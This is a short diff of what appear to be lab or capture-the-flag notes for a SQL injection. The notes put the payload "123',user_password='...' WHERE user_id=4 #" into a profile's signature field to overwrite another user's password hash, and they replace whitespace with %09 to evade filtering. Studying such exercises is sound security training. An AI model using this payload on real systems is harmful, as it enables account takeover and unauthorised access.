@@ -1,8 +1,4 @@
-"param"="123"
-alice
+123
+"signature"="123',user_password='202cb962ac59075b964b07152d234b70' WHERE user_id=4 #"
 
-in the alice's profile page, change the signature field to 
-
-123',user_password='202cb962ac59075b964b07152d234b70' WHERE user_id=4 #
-
-in tamper, change all the whitespace to %09
+in the alice's profile page, change the signature field to "123',user_password='202cb962ac59075b964b07152d234b70' WHERE user_id=4 #" then via tamper, change all the whitespace to %09
